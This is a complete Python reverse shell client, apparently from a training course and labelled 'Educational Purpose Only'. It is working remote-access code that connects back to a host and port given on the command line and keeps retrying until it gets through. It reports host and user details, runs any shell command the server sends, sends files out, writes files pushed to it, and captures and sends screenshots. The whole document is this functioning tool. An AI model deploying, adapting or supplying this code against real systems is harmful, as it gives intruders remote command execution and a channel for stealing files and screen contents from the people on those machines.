#!/usr/bin/env python3
"""
Reverse Shell Client
By Inlighn Tech
Educational Purpose Only
"""

import socket
import subprocess
import os
import sys
import json
import time
import base64
import struct
import platform
import threading
from typing import Optional, Dict, Any

class ReverseShellClient:
    """Reverse Shell Client Implementation"""
    
    def __init__(self, host: str = '127.0.0.1', port: int = 4444):
        self.host = host
        self.port = port
        self.socket = None
        self.connected = False
        self.buffer_size = 4096
        self.system = platform.system()
        
    def connect(self) -> None:
        """Connect to server with retry mechanism"""
        while True:
            try:
                print(f"[*] Connecting to {self.host}:{self.port}...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                self.connected = True
                print("[+] Connected to server")
                
                # Send system information
                self.send_system_info()
                
                # Start command loop
                self.command_loop()
                
            except (ConnectionRefusedError, socket.error) as e:
                print(f"[!] Connection failed: {e}")
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)
            except KeyboardInterrupt:
                print("\n[!] Client terminated by user")
                sys.exit(0)
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(5)
            finally:
                self.connected = False
                if self.socket:
                    try:
                        self.socket.close()
                    except:
                        pass
    
    def send_system_info(self) -> None:
        """Send system information to server"""
        try:
            info = {
                'hostname': socket.gethostname(),
                'os': platform.system(),
                'release': platform.release(),
                'machine': platform.machine(),
                'user': os.getlogin() if hasattr(os, 'getlogin') else 'Unknown'
            }
            self.socket.send(json.dumps(info).encode())
        except:
            pass
    
    def command_loop(self) -> None:
        """Main command processing loop"""
        while self.connected:
            try:
                # Receive command with length prefix
                raw_length = self.socket.recv(8)
                if not raw_length:
                    print("[!] Connection closed by server")
                    break
                    
                length = struct.unpack('>Q', raw_length)[0]
                
                # Receive command data
                data = b''
                while len(data) < length:
                    chunk = self.socket.recv(min(self.buffer_size, length - len(data)))
                    if not chunk:
                        break
                    data += chunk
                
                if not data:
                    break
                    
                command_data = json.loads(data.decode())
                command = command_data.get('command', '')
                
                if not command:
                    continue
                
                # Process special commands
                if command.lower() == 'exit':
                    print("[*] Exit command received. Disconnecting...")
                    self.connected = False
                    break
                elif command.lower().startswith('download '):
                    self.handle_download(command[9:])
                elif command.lower().startswith('upload '):
                    self.handle_upload(command[7:], command_data.get('data', ''))
                elif command.lower() == 'screenshot':
                    self.handle_screenshot()
                else:
                    # Execute system command
                    self.execute_command(command)
                    
            except json.JSONDecodeError:
                print("[!] Invalid command format")
            except socket.error as e:
                print(f"[!] Socket error: {e}")
                self.connected = False
                break
            except Exception as e:
                print(f"[!] Error in command loop: {e}")
                self.send_response(False, str(e))
    
    def execute_command(self, command: str) -> None:
        """Execute system command"""
        try:
            # Handle directory change
            if command.lower().startswith('cd '):
                try:
                    os.chdir(command[3:].strip())
                    output = f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    output = f"Error: {e}"
                self.send_response(True, output)
                return
            
            # Execute command
            if self.system == 'Windows':
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
            
            stdout, stderr = process.communicate(timeout=30)
            
            if stderr:
                output = stderr
            else:
                output = stdout
                
            if not output:
                output = "Command executed successfully (no output)"
                
            self.send_response(True, output)
            
        except subprocess.TimeoutExpired:
            self.send_response(False, "Command execution timed out")
        except Exception as e:
            self.send_response(False, f"Error executing command: {e}")
    
    def handle_download(self, file_path: str) -> None:
        """Handle file download request from server"""
        try:
            if not os.path.exists(file_path):
                self.send_response(False, f"File not found: {file_path}")
                return
            
            # Read and encode file
            with open(file_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            # Send file data
            response = {
                'status': 'success',
                'data': file_data,
                'output': f'File downloaded: {os.path.basename(file_path)}'
            }
            self.send_raw_response(response)
            
        except Exception as e:
            self.send_response(False, f"Download error: {e}")
    
    def handle_upload(self, file_path: str, file_data: str) -> None:
        """Handle file upload from server"""
        try:
            if not file_data:
                self.send_response(False, "No file data received")
                return
            
            # Decode and save file
            decoded_data = base64.b64decode(file_data)
            
            with open(file_path, 'wb') as f:
                f.write(decoded_data)
            
            self.send_response(True, f"File uploaded successfully: {file_path}")
            
        except Exception as e:
            self.send_response(False, f"Upload error: {e}")
    
    def handle_screenshot(self) -> None:
        """Handle screenshot request"""
        try:
            # Try to import required modules
            try:
                import mss
                import mss.tools
            except ImportError:
                self.send_response(False, "Required module 'mss' not installed")
                return
            
            with mss.mss() as sct:
                # Capture screenshot
                screenshot = sct.grab(sct.monitors[1])
                # Convert to PNG
                from PIL import Image
                import io
                
                img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                buffer = io.BytesIO()
                img.save(buffer, format='PNG')
                image_data = buffer.getvalue()
                
                # Encode and send
                encoded = base64.b64encode(image_data).decode()
                
                response = {
                    'status': 'success',
                    'data': encoded,
                    'output': 'Screenshot captured'
                }
                self.send_raw_response(response)
                
        except Exception as e:
            self.send_response(False, f"Screenshot error: {e}")
    
    def send_response(self, success: bool, output: str) -> None:
        """Send command response to server"""
        response = {
            'status': 'success' if success else 'error',
            'output': output
        }
        self.send_raw_response(response)
    
    def send_raw_response(self, response: Dict[str, Any]) -> None:
        """Send raw response with length prefix"""
        try:
            json_data = json.dumps(response).encode()
            length = len(json_data)
            
            # Send length prefix
            self.socket.send(struct.pack('>Q', length))
            
            # Send data
            self.socket.send(json_data)
            
        except Exception as e:
            print(f"[!] Error sending response: {e}")
            self.connected = False

def main():
    """Main function"""
    print("=" * 60)
    print("REVERSE SHELL CLIENT")
    print("By Inlighn Tech")
    print("=" * 60)
    
    # Parse command line arguments
    host = '127.0.0.1'
    port = 4444
    
    if len(sys.argv) > 1:
        host = sys.argv[1]
    if len(sys.argv) > 2:
        try:
            port = int(sys.argv[2])
        except ValueError:
            print("[!] Invalid port. Using default port 4444")
    
    client = ReverseShellClient(host, port)
    client.connect()

if __name__ == "__main__":
    main()